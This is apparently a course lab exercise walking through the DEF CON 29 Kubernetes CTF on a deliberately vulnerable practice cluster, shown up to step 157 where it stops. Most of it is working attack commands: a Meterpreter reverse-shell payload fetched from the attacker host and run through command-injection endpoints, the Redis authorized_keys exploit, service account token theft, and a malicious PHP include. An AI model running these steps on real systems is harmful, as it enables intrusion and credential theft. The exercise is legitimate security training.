---
layout: exercise
exercise: 140
title: "Exercise: DEF CON 29 Kubernetes CTF"
tools: openssh-client kubectl curl jq metasploit-framework netcat-traditional
directories_to_sync: ssh-config

---

## Steps

1. Start up a fresh lxterminal by clicking the "sparrow" logo in the bottom-left corner of the screen, clicking run, typing `lxterminal` and hitting enter. Alternatively, use the hot key sequence below:

    ```
    <hold down Alt><hit F2>lxterminal<HIT the enter key>
    ```

2. Start your Kubernetes cluster - we will use this one for all Kubernetes exercises except for the Cloud Attacks, Peirates and Node Attacks:

    ```shell
    /sync/bin/suspend-all-vms.sh
    /sync/bin/start-bustakube.sh
    ```

3. SSH into the control plane node on the cluster:

    ```shell
    ssh -i /sync/bustakube-node-key root@bustakube-controlplane
    ```

4. Start the CTF scenario:

    ```shell
    /usr/share/bustakube/Scenario-DEFCONCTF29/stage-scenario.sh
    ```

5. Start a new terminal tab by hitting `Ctrl-Shift-t`.

    ```
    Hit Ctrl-Shift-t
    ```

6. Create a directory for this exercise and switch into it:

    ```shell
    mkdir -p ~/ctf29
    cd ~/ctf29
    ```

7. Create a Meterpreter binary for 64-bit x86 Linux:

    ```shell
    msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=10.23.58.30 -f elf -o mrsbin
    ```

8. Set up a web server to listen on tcp/9000.

    ```shell
    python3 -m http.server 9000
    ```

9. Start a new terminal tab by hitting `Ctrl-Shift-t`.

    ```
    Hit Ctrl-Shift-t
    ```

10. Let's start up a Metasploit console and run a multi/handler that matches the same IP address. Start by creating an RC file for this:

    ```shell
    cat <<END >multi-handler.rc
    use exploit/multi/handler
    set PAYLOAD linux/x64/meterpreter/reverse_tcp
    set LHOST 10.23.58.30
    set ExitOnSession false
    exploit -j
    END
    ```

11. Now run msfconsole, telling it to start by running those commands.

    ```shell
    msfconsole -r multi-handler.rc
    ```

12. Start a new terminal tab by hitting `Ctrl-Shift-t`.

    ```
    Hit Ctrl-Shift-t
    ```

13. Run a TCP port scan of the first node's TCP ports that are reserved for node ports.  

    ```shell
    nmap -Pn -sT -p30000-32767 bustakube-node-1
    ```

14. Interact with the service that's running on TCP port 30080:

    ```shell
    curl http://bustakube-node-1:30080/
    ```

15. Observe that you get a mysterious answer.  Here's the output on our test system:

    ```
    / is not a valid resource.
    ```

16. Try putting a random useful word on the end of that URL, using -v to see error codes:

    ```shell
    curl -v http://bustakube-node-1:30080/admin
    ```

17. Observe that you received a standard HTTP 404 error. Here's an excerpt of the output from our test system:

    ```
    < HTTP/1.1 404 Not Found
    < Content-Type: text/html
    ```

18. Let's assume that you ran dirbuster for a while, trying different words on the end of the URL until you found a request that didn't give you a HTTP 404 status code.  The one you found was for `/vent`.  Try that with curl.

    ```shell
    curl http://bustakube-node-1:30080/vent
    ```

19. Observe the answer tells you that `/vent` takes a parameter called "cmd," which sounds like "command." Here's the output from our test system:

    ```
    /vent requires a parameter of cmd
    ```

20. Next, try passing a command in. We'll use "id".

    ```shell
    curl http://bustakube-node-1:30080/vent?cmd=id
    ```

21. Observe that you're told that this parameter must be Base64-encoded. Here's the output from our test system:

    ```
    cmd parameter must be Base64-encoded.
    ```

22. Try Base64-encoding "id" and passing it as the value for `cmd`:

    ```shell
    value=$( echo "id" | base64 -w 0)
    curl http://bustakube-node-1:30080/vent\?cmd=$value
    ```

23. Observe that you are running commands as root on the target.  Here's the output from our test system:

    ```
    uid=0(root) gid=0(root) groups=0(root)
    ```

24. Let's try that again, but now let's make the command we run be one that makes the target pull down a copy of our Meterpreter.

    ```shell
    cmd='curl -o /mrsbin http://10.23.58.30:9000/mrsbin'
    value=$( echo $cmd | base64 -w 0 )
    curl http://bustakube-node-1:30080/vent?cmd=$value
    ```

25. Check to make sure that the "mrsbin" file was retrieved and written to the filesystem:

    ```shell
    cmd='ls -l /mrsbin'
    value=$( echo $cmd | base64 -w 0 )
    curl http://bustakube-node-1:30080/vent?cmd=$value
    ```


26. Next, have this `/vent` program make our binary executable and run it. We won't be getting another shell prompt in this tab right now, as this request will be continuing until the `mrsbin` program exists.

    ```shell
    cmd="chmod u+x /mrsbin ; /mrsbin"
    value=$( echo $cmd | base64 -w 0 )
    curl http://bustakube-node-1:30080/vent?cmd=$value
    ```

27. Go back to the Metasploit console window, where you'll see the exploit connect - here's the output on our test system:

    ```
    [*] Meterpreter session 1 opened (10.23.58.30:4444 -> 10.23.58.42:38088) at 2022-08-05 17:17:30 -0400
    ```

28. Interact with that session;

    ```shell
    sessions -i 1
    ```

29. Start a shell

    ```shell
    shell
    ```

30. Start bash -i in this to make it easier to use.

    ```shell
    bash -i
    ```

31. List the current directory:

    ```shell
    ls
    ```

32. Read the contents of `HINT.txt`:

    ```shell
    cat HINT.txt
    ```

33. Let's see what namespace this pod is in.

    ```shell
    cat /run/secrets/kubernetes.io/serviceaccount/namespace
    ```

34. It looks like we're in the `joeys-vent` namespace. We have kubectl - let's set an alias for kubectl to use the service account token mounted in the pod.  Our alias is going to include `-n joeys-vent` in it, because the alias set up will read that same namespace file that we just read.

    ```shell
    tokendir="/run/secrets/kubernetes.io/serviceaccount"
    alias kubectl="kubectl --token=$(cat $tokendir/token) \
    --server="https://kubernetes.default.svc.cluster.local" \
    --certificate-authority=$tokendir/ca.crt \
    -n $(cat $tokendir/namespace)" 
    ```

35. Get the secret:

    ```shell
    kubectl get secret joeys-flag-floppy-disk
    ```

36. Just get the data part of the secret:

    ```shell
    kubectl get secret joeys-flag-floppy-disk -o yaml | \
    egrep -A 1 '^data:'
    ```

37. Decode the "flag" item in that secret:

    ```shell
    kubectl get secret joeys-flag-floppy-disk -o yaml | \
     egrep -A 1 '^data:' | grep flag | awk '{print $2}' | base64 -d
    ```

38. You'll find the secret contents look something like this:

    ```
    joeys-floppy-disk-FLAG-b6e3f5a1-62dc-47e5-9a4d-6182f38812b8
    ```

39. The HINT.txt file also said to find a Redis server without port scanning. Enumerate for a while if you like.  Eventually, you might decide to look for configmaps, which are used to send non-secret configuration information into a container:

    ```shell
    kubectl get configmaps
    ```

40. Notice that there's a juicy one called ```scoring-gibsons``` - go read it.  This time, we'll get our kubectl output as json and parse it with jq, which has helpfully been installed in the container image:

    ```shell
    kubectl get configmaps scoring-gibsons -o json | jq .data
    ```

41. Review the config map - you'll see these items (along with others) in the text - note - the IP addresses in our sample output here won't match yours.  If you're curious, the `sship` IP address is the IP address for a pod, so it will be within the IP range reserved for the pods on whichever node it is on.  On our test system, the three nodes have pod networks `10.32.0.0`,`10.36.0.0`, and `10.39.0.0`.  The `ip` IP address is for a Kubernetes service and so it's on the service IP network.

    ```
    {
      "hint": "ip is the IP address of a Redis server while port is the port for that Redis server",
      "ip": "10.103.149.8",
      "port": "45912",
      "sship": "10.32.0.2"
    }
    ```

42. Parse the `ip` item out of the config map:

    ```shell
    kubectl get configmaps scoring-gibsons -o json | jq -r '.data.ip'
    ```

43. Now store that IP in a variable:

    ```shell
    ip=$(kubectl get configmaps scoring-gibsons -o json| jq -r '.data.ip')
    ```

44. Ping the redis server via the `redis_cli` `ping` command:

    ```shell
    redis-cli -h $ip -p 45912 ping
    ```

45. Wow - we're able to run commands on the redis server without authentication. Read about what that means we can do to it, if you like:

    <http://antirez.com/news/96>

46. The summary of that article is that we can exploit Redis to get it to write to the filesystem of this container. Luckily, we'll find this container is also running an SSH server.

47. Also, parse the `sship` out of the configmap:

    ```shell
    sship=$(kubectl get cm scoring-gibsons -o json | jq -r '.data.sship')
    ```

48. You may have noticed that we just used `kubectl get cm` instead of `kubectl get configmaps`. How did we know that Kubernetes takes `cm` as an abbreviation? Kubernetes will tell you short names for resources that have them, like "po" for "pods", "cm" for "configmaps", and "crd" for "customresourcedefinition" if you run this command:

    ```shell
    kubectl api-resources
    ```

49. Try connecting to the `sship` IP address on port 22 with netcat (nc):

    ```shell
    nc $sship 22
    ```

50. Hit the enter key to get the SSH server to close the netcat session.

    ```
    Hit the enter key
    ```

51. Run `ssh-keygen` to begin the creation of an SSH key.

    ```shell
    ssh-keygen -t RSA -C "crack@crack"
    ```

52. Hit the enter key three times to finish creating this SSH key.

    ```
    Hit the enter key
    Hit the enter key a second time
    Hit the enter key a third time
    ```

53. Run the classic Redis exploit.

    ```shell
    cd /root/.ssh
    (echo -e "\n\n"; cat id_rsa.pub ; echo -e "\n\n") >foo.txt
    alias rediscli="redis-cli -h $ip -p 45912"
    rediscli flushall
    cat foo.txt | rediscli -x set crackit
    rediscli config set dir /root/.ssh
    rediscli config set dbfilename "authorized_keys"
    rediscli save
    ```
 
54. Try to SSH into the container - this will work, but you'll see no prompt or even output for your commands. Don't worry.

    ```shell
    ssh -o "StrictHostKeyChecking=false" root@$sship
    ```

55. Run `bash -i` to get a more friendly environment.

    ```shell
    bash -i
    ```

56. Nice! You now have remote code execution in a new pod, called "cereal-redis". Check out what namespace it is in:

    ```shell
    cat /run/secrets/kubernetes.io/serviceaccount/namespace
    ```

57. We're in a new namespace called `cereals-rainbow-books`! OK, next explore the filesystem, listing files in the / directory in reverse timestamp order:

    ```shell
    ls -lart /
    ```

58. There's a `/data` directory that is a little unusual.  Check it out:

    ```shell
    ls /data
    ```

59. It looks like we've found a HINT.txt file - let's see its contents:

    ```shell
    cat /data/HINT.txt
    ```

60. Read the hint and get a FLAG:

    ```
    Congratulations! You've made it to the cereal-rainbow-books namespace.

    First, grab your flag:  flag-cereal.

    Second, go check out the services in the phreaks-nynex-kingdom namespace.

    NOTE: this has two tricky bits...
    ```


61. We'll have to use a new kubectl alias to use this pod's service account token:

    ```shell
    tokendir="/run/secrets/kubernetes.io/serviceaccount"
    alias kubectl="kubectl --token=$(cat $tokendir/token) \
    --server="https://kubernetes.default.svc.cluster.local" \
    --certificate-authority=$tokendir/ca.crt \
    -n $(cat $tokendir/namespace)"
    ```

62. Go get the flag!

    ```shell
    kubectl get secret flag-cereal -o yaml | egrep -A 1 '^data'
    ```

63. Parse that secret

    ```shell
    kubectl get secret flag-cereal -o yaml | egrep -A 1 '^data' | \
     grep flag | awk '{print $2}' | base64 -d
    ```

64. Note that the flag is similar to this:

    ```
    cereals-rainbow-books-FLAG-b2a6325d-613e-4fc7-9a75-1fbbd4317662
    ```

65. Let's explore the services in the phreaks-nynex-kingdom namespace:

    ```shell
    kubectl -n phreaks-nynex-kingdom get services
    ```

66. Make things easier by locking the namespace to `phreaks-nynex-kingdom` with an alias:


    ```shell
    tokendir="/run/secrets/kubernetes.io/serviceaccount"
    alias kubectl="kubectl --token=$(cat $tokendir/token) \
    --server="https://kubernetes.default.svc.cluster.local" \
    --certificate-authority=$tokendir/ca.crt \
    -n phreaks-nynex-kingdom" 
    ```

67. Try to read the blade service - this will fail:

    ```shell
    kubectl get service blade -o yaml
    ```

68. So our current service account token isn't allow to get the content of a specific service. Let's ask what it can do in this namespace:

    ```shell
    kubectl auth can-i --list
    ```

69. So we're allow to list services, but not request them one by one.  One the one hand, we could just ask for a list of all services as YAML, which will give us all the information about the blade service, but also about all the others:

    ```shell
    kubectl get services -o yaml
    ```

70. On the other hand, we can get what we need by just asking for the list in "wide" format and let `kubectl` do the parsing:

    ```shell
    kubectl get services -o wide
    ```

71. There's one service called whats-the-password-rce and one called blade. If we read their labels, we see that blade sends its traffic to pods whose app labels are set to blade. We can look at that soon, but let's investigate the `whats-the-password-rce` service.

72. Try to reach out to the whats-the-password-rce service. We've added a connection timeout here, since we know the connection won't be successful.

    ```shell

    curl -k --connect-timeout 5 \
     http://whats-the-password-rce.phreaks-nynex-kingdom.svc.cluster.local:46231
    ```

73. This connection timeout. The puzzle here for the CTF is to guess that there's a firewall rule here, created by a network policy.

74.  Let's look for network policies:

        ```shell
        kubectl -n phreaks-nynex-kingdom get networkpolicies
        ```

75. Notice that there is one network policy named `default-deny-all`. Here's the output from our test system:

    ```
    NAMESPACE               NAME               POD-SELECTOR   AGE
    phreaks-nynex-kingdom   default-deny-all   <none>         9h
    ```

76. We can learn more about that network policy with `describe`:

    ```shell
    kubectl -n phreaks-nynex-kingdom describe networkpolicies
    ```

77. Notice that this network policy blocks all incoming network traffic to every pod in the `phreaks-nynex-kingdom` namespace. Here's en excerpt from the output on our test system:

    ```
    PodSelector:     <none> (Allowing the specific traffic to all pods in this namespace)
    Allowing ingress traffic:
      <none> (Selected pods are isolated for ingress connectivity)
    Not affecting egress traffic
    Policy Types: Ingress
    ```

78. Let's try deleting the network policy!

    ```shell
    kubectl -n phreaks-nynex-kingdom delete networkpolicy default-deny-all
    ```

79. It worked! Let's try our curl again:

    ```shell

    curl -k --connect-timeout 5 \
     http://whats-the-password-rce.phreaks-nynex-kingdom.svc.cluster.local:46231
    ```

80. You're asked for a password and command.  Here's the output from our test system:

    ```
    / requires two parameters: password and cmd
    ```

81. For the command, we'll use "id". For the password, let's try "password".  Note: the URL is very long, so we're going to put it in a variable to make this easier to read:

    ```shell

    url="http://whats-the-password-rce.phreaks-nynex-kingdom:46231"
    curl -sk  ${url}/?cmd=id\&password=password
    ```

82. OK, so that got us an error message about an incorrect password.  Here's the output from our test system:

    ```
    Password is not correct
    ```

83. Notice that we used a shorter DNS name for the service this time. We used `whats-the-password-rce.phreaks-nynex-kingdom` instead of `whats-the-password-rce.phreaks-nynex-kingdom.svc.cluster.local`. It turns out the pods all have `svc.cluster.local` in their domain search list in `/etc/resolv.conf`.

84. Let's try some of the different passwords from that the movie claimed were the most common: "love", "secret", and "god".    

    ```shell
    curl -sk  ${url}/?cmd=id\&password=love
    curl -sk  ${url}/?cmd=id\&password=secret
    curl -sk  ${url}/?cmd=id\&password=god
    ```

85. Observe that the password was "god" - here's the output from our test system:

    ```
    cmd parameter must be Base64-encoded.
    ```

86. This is similar to how we got into the cluster. We just need to Base64-encode our `cmd` value. Let's try this:

    ```shell
    value=$( echo "id" | base64 -w 0 )
    curl -sk  ${url}/?cmd=$value\&password=god
    ```


87. Now use this as a shell to get a new Meterpreter.

    ```shell
    cmd="curl -o /tmp/mrsbin http://10.23.58.30:9000/mrsbin"
    curl -sk  ${url}/?password=god\&cmd=$(echo $cmd | base64)
    cmd="chmod 755 /tmp/mrsbin"
    curl -sk  ${url}/?password=god\&cmd=$(echo $cmd | base64)
    cmd="/tmp/mrsbin"
    curl -sk  ${url}/?password=god\&cmd=$(echo $cmd | base64)
    ```

88. Let's switch to the new session.  First, hit Ctrl-Z to background this Meterpreter channel.

    ```
    Hit Ctrl-z
    ```

89. Next, hit y to confirm.

    ```
    Hit y
    ```

90. Now, tell the Metasploit console that you'd like to background the session:

    ```shell
    background
    ```

91. Get a list of sesssions:

    ```shell
    sessions -l
    ```

92. Switch to the new session:

    ```shell
    sessions -i 2
    ```

93. Start a shell:

    ```shell
    shell
    ```

94. Run `bash -i` to make it more friendly.

    ```shell
    bash -i
    ```

95. Now we are in a pod called "whats-the-password-rce".  List the current directory:

    ```shell
    ls
    ```

96. Read the hint.

    ```shell
    cat HINT.txt
    ```

97. The hint says this:

    ```
    Go get your flag: flag-phreaks-payphone-trick.

    From here, there are multiple serial challenges that won't 
    give you a new pod yet.

    Flag challenge 1:

    Razor reaches Blade by way of a service.  Can you intercept
    the messages? There's a flag and a service account token in 
    these.

    Note: the service account token isn't Razor's or Blade's token.


    Flag challenge 2:

    Once you have that next service account token, you need to 
    steal the davinci service account's token in the 
    ellingson-min namespace.

    This will allow you to claim the flag-davinci secret in that
    namespace.

    Flag challenge 3:

    Connect to the ellingson-min namespace's gibson pod and get 
    remote execution inside that pod.
    ```

98. Set up a new alias for this pod in this namespace.

    ```shell
    tokendir="/run/secrets/kubernetes.io/serviceaccount"
    alias kubectl="kubectl --token=$(cat $tokendir/token) \
    --server="https://kubernetes.default.svc.cluster.local" \
    --certificate-authority=$tokendir/ca.crt \
    -n $(cat $tokendir/namespace)" 
    ```

99. Try listing services, but find you aren't permitted to get that list.

    ```shell
    kubectl get services
    ```

100. Ask what your service account token is allow to do with ```kubectl auth can-i --list```


        ```shell
        kubectl auth can-i --list
        ```

101. We can read a secret called ```flag-phreaks-payphone-trick``` and we can create pods.  Get the flag first.

        ```shell
        kubectl get secret flag-phreaks-payphone-trick -o yaml | \
          egrep -v '^data:' | grep flag | \
          awk '{print $2}' | head -1 | base64 -d
        ```

102. You get a flag similar to or the same as this: 

        ```phreaks-payphone-trick-FLAG-b74f826e-0e10-453a-9d07-58e1796f968e```

103. We can create a pod to MitM blade and razor, but we'll need to read the services to do this. If you didn't take notes, go back to the cereal pod and read the services.  Otherwise, just use the blade service.

        ```shell
        curl http://blade.phreaks-nynex-kingdom
        ```

104. This shows us a form - it looks like the form is going to take submissions that look like this:

        ```
        http://blade.phreaks-nynex-kingdom/index.php?flag=s&token=s&submit=submit
        ```

105. We saw from the service file that it redirects traffic for this URL to any pods in the ```phreaks-nynex-kingdom``` namespace, so long as their ```app``` label is set to ```blade```.  We can receive some of the traffic that's going to `blade` pods if we can stage our own pod in this namespace and set its `app` label to `blade`. For this pod, we'll want to use an image that lets us see the valid requests coming from the `razor` pod. 

106. Think about what image we should use for this pod. We could use an image that would be vulnerable to remote code execution, but we don't really need to run commands in this new pod. We just need to see the incoming HTTP requests.  Since the requests are GET requests, their parameters will be logged in the webserver logs. That's the key. We have an image that runs a webserver which serves up its own log files. Here's its Dockerfile, if you're curious. It's publicly-available on Docker Hub, but it's also cached on the Bustakube cluster's registry.

        ```
        # dockerhub: bustakube/webserver-sharemylogs:latest
        FROM nginx:latest
        RUN sed -i 's/server {/server {  disable_symlinks off;/' /etc/nginx/conf.d/default.conf
        RUN sed -i 's/location \/ {/location \/ {   autoindex on;/' /etc/nginx/conf.d/default.conf
        RUN ln -s /var/log/nginx /usr/share/nginx/html/log
        RUN rm /var/log/nginx/access.log /var/log/nginx/error.log
        COPY index.html /usr/share/nginx/html/
        RUN chown -R nginx /usr/share/nginx /var/log/nginx /var/cache/nginx /var/run
        RUN chmod 777 /var/run
        RUN sed -i 's/listen       80;/listen   8000;/' /etc/nginx/conf.d/default.conf
        RUN cat /etc/nginx/conf.d/default.conf
        USER nginx
        EXPOSE 8000
        ```

107. Let's create a template for a pod that has its `app` label set to `blade`. It will use the `bustakube:webserver-sharemylogs` image.

        ```shell
        kubectl -o yaml --dry-run=client run mitm \
          --image="bustakube/webserver-sharemylogs" \
          --labels "app=blade"
        ``` 

108. Now let's create this pod it for real. Pretend this got blocked. (Note: it's not going to get blocked, but it should be...):

        ```shell
        #kubectl run mitm \
        #  --image="bustakube/webserver-sharemylogs" \
        #  --labels "app=blade"
        ``` 

109. Unfortunately, we (are supposed to) have a Pod Security Policy that's blocking us. At Black Hat 2023 this year, this PSP is missing or otherwise not working. When we did the exercise, here's the output we got on our test system:

        ```
        Error from server (Forbidden): pods "mitm" is forbidden: PodSecurityPolicy: no providers available to validate pod request
        ```


110. Let's upload a template file that sets a security context. Read the file over - you'll see that we make our pod say containers will run as a non-root user and group (UID and GID 101), that we set "allowPrivilegeEscalation: false," which deactivates Set-UID binaries, and tell the system to use the default apparmor and seccomp profiles.

        ```shell
        cat <<END >pod-mitm.yaml
        apiVersion: v1
        kind: Pod
        metadata:
          name: mitm
          namespace: phreaks-nynex-kingdom
          labels:
            app: blade
          annotations:
            container.apparmor.security.beta.kubernetes.io/mitm: runtime/default
            seccomp.security.alpha.kubernetes.io/pod: runtime/default
        spec:
          securityContext:
            runAsUser: 101
            runAsGroup: 101
            fsGroup: 101
          containers:
          - name: mitm
            image: docker-registry:5000/bustakube/webserver-sharemylogs
            securityContext:
              allowPrivilegeEscalation: false
          imagePullSecrets:
          - name: regcred-docker-registry-5000
        END
        ```

111. Now apply it:

        ```shell
        kubectl apply -f pod-mitm.yaml
        ```

112. Now let's get code execution inside the pod we launched. We don't have permissions to exec into pods, but, since we chose the image that runs there, we chose an image we built with an intentional vulnerability.

113. Get the pod's IP address:

        ```shell
        kubectl get pod mitm -o wide
        ```
114. Let's parse the IP out of that listing and put it in a variable called `podip`.

        ```shell
        podip=$(kubectl get pod mitm -o wide | grep mitm | awk '{print $6}')
        ```
115. Let's request the access.log from this pod's web server:

        ```shell
        curl -s http://${podip}:8000/log/access.log
        ```

116. We can get a flag out of this output! Let's grab the lines that have `flag=` in them:

        ```shell
        curl -s http://${podip}:8000/log/access.log | grep 'flag=' >log
        ```

117. Now get just one line from that file:

        ```shell
        head -1 log >oneline
        ```

118. Grab the flag itself from that line:

        ```shell
        cat oneline | awk -Fflag= '{print $2}' | awk -F\& '{print $1}'
        ```

119. Grab the service account token out of that line.

        ```shell
        cat oneline | awk -Fserviceaccounttoken= '{print $2}' | \
          awk '{print $1}' | base64 -d ; echo ""
        ```

120. That token will look like this:

        ```
        eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwUnZfbTZQV2tEQlFQaGt1b2Q1S21QZ3ByT21wamZ2QVpORC1jZWVFZzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJlbGxpbmdzb24tbWluIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6InRoZXBsYWd1ZS10b2tlbi1iOW1wbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJ0aGVwbGFndWUiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI3ZDk0NmJiMC1iMmVhLTRiOTMtODY1ZS0yMmVlZGY3NzM4ZDYiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZWxsaW5nc29uLW1pbjp0aGVwbGFndWUifQ.c7-eNe66P4U_W1wfb4KgOdLU-oMPvm_goxNKiccLyfNvxKw92vjc5riFlJZ6UiuG0dsQRywz5WoEWnI-aq5jK8ygbSdCmQ03KHEZ4H0hP3lMYnOjDyb0Jjzd1i0a9UPaxJUQRSw0mrdJ3ItjR43Jx8zo_SiNwdAa-fqYOtQMvzEXxERyz-UFl4ZJxcCoc4n2FQdK6AUoG8ZDua8v9B0rUkmuGvFPRQbVwrCL3M_WY9ebOMFipr88ZsjwztRVEOrNpe1T97LL8W3oX0YuZbX_eNnkYGwrMFcXpgl-68Q9Ame8ssISkvVLiT8RheUaplmOzPzuCbcE2rft863CI08KtA
        ```

121. Write that token to a file:

        ```shell
        cat oneline | awk -Fserviceaccounttoken= '{print $2}' | \
          awk '{print $1}' | base64 -d >/newtoken
        ```

122. Make a new alias for kubectl using this new token

        ```shell
        tokendir="/run/secrets/kubernetes.io/serviceaccount"
        alias kubectl="kubectl --token=$( cat /newtoken ) \
        --server="https://kubernetes.default.svc.cluster.local" \
        --certificate-authority=$tokendir/ca.crt \
        -n $(cat $tokendir/namespace)" 
        ```

123. Now try using it to list pods

        ```shell
        kubectl get pods
        ```

124. Observe that you're not permitted to list pods in this namespace using that token. The error message is helpful, though. It says that the token is authenticating you as `theplague` from the `ellingson-min` namespace. Here's the output from our test system:

        ```
        Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:ellingson-min:theplague" cannot list resource "pods" in API group "" in the namespace "phreaks-nynex-kingdom"
        ```

125. Alter our kubectl alias to use the ellingson-min namespace:

        ```shell
        tokendir="/run/secrets/kubernetes.io/serviceaccount"
        alias kubectl="kubectl --token=$( cat /newtoken ) \
        --server=https://kubernetes.default.svc.cluster.local \
        --certificate-authority=$tokendir/ca.crt \
        -n ellingson-min"
        ```

126. Test this:

        ```shell
        kubectl -n ellingson-min get pods
        ```

127. Notice that we have a Gibson pod, corresponding to the big mainframe in the movie:

        ```
        NAME     READY   STATUS    RESTARTS   AGE
        gibson   1/1     Running   0          8h
        ```

128. Our HINT's next step was:

        ```
        Once you have that next service account token, you need to 
        steal the davinci service account's token in the 
        ellingson-min namespace.

        This will allow you to claim the flag-davinci secret in that
        namespace.
        ```

129. This is the next puzzle in the CTF. How can you steal the `davinci` service account token in the `ellingson-min` namespace?

130. Find out what your new service account token is allowed to do in the `ellingson-min` namespace:

        ```shell
        kubectl -n ellingson-min auth can-i --list
        ```

131. Notice that we're allowed to create, list and read pods and that we're also allowed to list and read services. Here's an excerpt of the output of the last command on our test system:

        ```
        pods                                            []                                    []               [create get list]
        ...
        services                                        []                                    []               [list get]
        ```

132. Here's the insight. If we can deploy a pod in this namespace, we can name any service account we'd like in the pod manifest. The pod will get that service account and will get a token as that account. There isn't anything in "stock" Kubernetes that would prevent that.

133. Let's deploy a new pod in the `ellingson-min` namespace, called `getsa`, naming `davinci` as the `serviceAccountName` value. We'll use an image called "sharemysatoken" which we've made that shares its web server logs, but also shares its serviceaccount token file:

        ```shell
        cat <<ENDL >pod.yaml
        apiVersion: v1
        kind: Pod
        metadata:
          name: getsa
          namespace: ellingson-min
          annotations:
            container.apparmor.security.beta.kubernetes.io/getsa: runtime/default
            seccomp.security.alpha.kubernetes.io/pod: runtime/default
        spec:
          serviceAccountName: davinci
          securityContext:
            runAsUser: 101
            runAsGroup: 100
            fsGroup: 100
          containers:
          - name: getsa
            image: docker-registry:5000/bustakube/sharemysatoken
            securityContext:
              allowPrivilegeEscalation: false
          imagePullSecrets:
          - name: regcred-docker-registry-5000
        ENDL

        kubectl apply -f pod.yaml
        ```

134. Now we want to request the token from that pod. Get its IP address:

        ```shell
        podip=$(kubectl get pod getsa -o wide | grep getsa | awk '{print $6}')
        ```

135. Request the token:

        ```shell
        curl http://${podip}:8000/token
        ```

136. Put the token in a file called "davincitoken":

        ```shell
        curl http://${podip}:8000/token >/davincitoken
        ```

137. Tweak your kubectl alias to use this token:

        ```shell
        alias kubectl="kubectl --token=$(cat /davincitoken) \
        --server="https://kubernetes.default.svc.cluster.local" \
        --certificate-authority=$tokendir/ca.crt \
        -n ellingson-min"
        ```

138. Ask what this token is allowed to do in the ellingson-min namespace:

        ```shell
        kubectl auth can-i --list
        ```

139. Notice that we're allowed to create, read and list services, read the `flag-davinci` secret, and read and list pods.

        ```
        services                                        []                                    []               [create get list]
        secrets                                         []                                    [flag-davinci]   [get]
        pods                                            []                                    []               [list get]
        ```

140. Grab the flag from the `flag-davinci` secret:

        ```shell
        kubectl get secret flag-davinci -o yaml | egrep -A 1 'data:' | \
          grep flag | awk '{print $2}' | base64 -d
        ```
141. Think about the last challenge:

        ```
        Flag challenge 3:

        Connect to the ellingson-min namespace's gibson pod and get 
        remote execution inside that pod.
        ```

142. To recap what privileges we have in this namespace: we have the `davinci` service account token (in `/davincitoken`), which is allowed to create services and configMaps and we have the `theplague` token (in `/newtoken`) which is allowed to create pods.

143. Let's set up a kubectl aliases for each token, to make things easier. First, `unalias` the `kubectl` command:

        ```shell
        unalias kubectl
        ```

144. Next, set up a `kubectl-theplague` alias for when we need to use `theplague`'s token.

        ```shell
        tokendir="/run/secrets/kubernetes.io/serviceaccount"
        alias kubectl-theplague="kubectl --token=$(cat /newtoken) \
        --server="https://kubernetes.default.svc.cluster.local" \
        --certificate-authority=$tokendir/ca.crt -n ellingson-min"
        ```

145. Finally, set up a `kubectl-davinci` alias for when we need to use `davinci`'s token.

        ```shell
        alias kubectl-davinci="kubectl --token=$(cat /davincitoken) \
        --server="https://kubernetes.default.svc.cluster.local" \
        --certificate-authority=$tokendir/ca.crt \
        -n ellingson-min"
        ```

146. So let's check out the `gibson` pod.  First, get its IP address:

        ```shell
        ip=$(kubectl-davinci get pods -o wide |grep gibson | awk '{print $6}')
        ```

147. Connect to the IP:

        ```shell
        curl -s http://$ip
        ```

148. Review the output from that page. The output from our test system follows:

        ```
        <html>
        <body>
        "Row, row, row!"
        <p>
        Unless five million dollars are transferred to the following numbered account in seven days, I will capsize five tankers in the Ellingson fleet.
        <p>
        This PHP page's next line of code is this:
        <p>
        <pre>
        include 'http://static.containersecurityctf.com/static-inclusion.php';
        </pre>
        <p>

        </body>
        </html>
        ```

149. What this means is that if we can intercept (MitM) gibson pod's request to http://static.containersecurityctf.com/static-inclusion.php, then we'd be able to run PHP in that pod. There's a vulnerability in Kubernetes that you can read about here:

        [CVE-2020-8554](https://github.com/kubernetes/kubernetes/issues/97076)

150. Stop and think about the steps we'll need to take to exploit this:

        1. Create a `static-inclusion.php` file that the gibson can pull down and run, granting RCE.
        2. Stage a pod running a web server that serves this file.
        3. Create an ExternalIP service that redirects outbound traffic that's going to the real `static.containersecurityctf.com` to the pod we just staged.
        4. Make a request against the gibson, triggering it to pull down `static-inclusion.php`.

151. OK, so step 1 - let's create that `static-inclusion.php` file. We want the file to be a valid PHP page, so let's start by putting the `<?php` header at the top.

        ```shell
        echo '<?php' >si.php
        ```

152. Next, let's add a line that defines our URL as a variable called `$url`:

        ```shell
        echo '$url = "http://10.23.58.30:9000/mrsbin"; ' >>si.php
        ```

153. Next, have the PHP run a command to request the `mrsbin` binary from our webserver and place it in `/tmp/`:

        ```shell
        echo '$cmd = shell_exec( "curl -o /tmp/mrsbin $url"); ' >>si.php
        ```

154. Now, have the PHP run a command to make `/tmp/mrsbin` executable and run it.

        ```shell
        echo '$cmd = shell_exec( "chmod 755 /tmp/mrsbin ; /tmp/mrsbin"); ' >>si.php
        ```

155. Finally, close out the PHP file:

        ```shell
        echo '?>' >>si.php
        ```

156. Rename the file to `static-inclusion.php`:

        ```shell
        mv si.php static-inclusion.php
        ```

157. Now it's time for step 2 - we need to create a pod to serve the `static-inclusion.php` file. We have container image that we can use - it's a simple Apache webserver that listens on port 8000. A very Kubernetes-style way of putting the content (`static-inclusion.php`) in the webserver is to put that content in some sort of volume that the pod can mount. That keeps the frequently-changing content out of the container image. 

